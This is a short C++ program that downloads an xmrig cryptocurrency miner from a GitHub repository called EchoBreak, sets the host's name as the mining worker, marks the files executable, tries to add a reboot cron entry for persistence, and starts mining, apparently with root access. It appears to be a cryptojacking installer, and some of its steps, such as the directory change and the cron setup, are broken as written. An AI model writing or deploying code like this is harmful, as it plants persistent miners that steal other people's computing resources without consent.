#include <iostream>
#include <stdlib.h>
#include <cstdio>
#include <memory>
#include <array>
#include <fstream>
#include <string>
#include <sstream>

std::string exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, int(*)(FILE*)> pipe(popen(cmd, "r"), pclose);
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }

    if (!result.empty() && result.back() == '\n') {
        result.pop_back();
    }

    return result;
}

void editFile(const std::string& filename, std::string workername) {
    std::ifstream inFile(filename);
    
    if (!inFile) {
        std::cerr << "Unable to open file " << filename << std::endl;
        return;
    }

    std::stringstream buffer;
    buffer << inFile.rdbuf();
    std::string contents = buffer.str();

    std::string oldText = "name_of_the_worker";
    std::string newText = workername;
    size_t startPos = 0;
    while((startPos = contents.find(oldText, startPos)) != std::string::npos) {
        contents.replace(startPos, oldText.length(), newText);
        startPos += newText.length();
    }

    inFile.close();

    std::ofstream outFile(filename);

    outFile << contents;

    outFile.close();
}

int main() {
    //=======Install=======
    // must run from root
    system("git clone https://github.com/Andrew-24coop/EchoBreak.git");
    system("cd EchoBreak/xmrig-6.22.2");
    //========Edit=========
    std::string compname = exec("hostname");
    std::string filename = "config.json";
    editFile(filename, compname);

    system("chmod +x xmrig");
    system("chmod +x SHA256SUMS");
    system("chmod +x config.json");
    
    //======Auto-run=======
    system("crontab -e");
    system("@reboot /root/EchoBreak/xmrig-6.22.2/xmrig"); // text from keyboard

    //=======Mining========
    system("./xmrig");
    return 0;
}
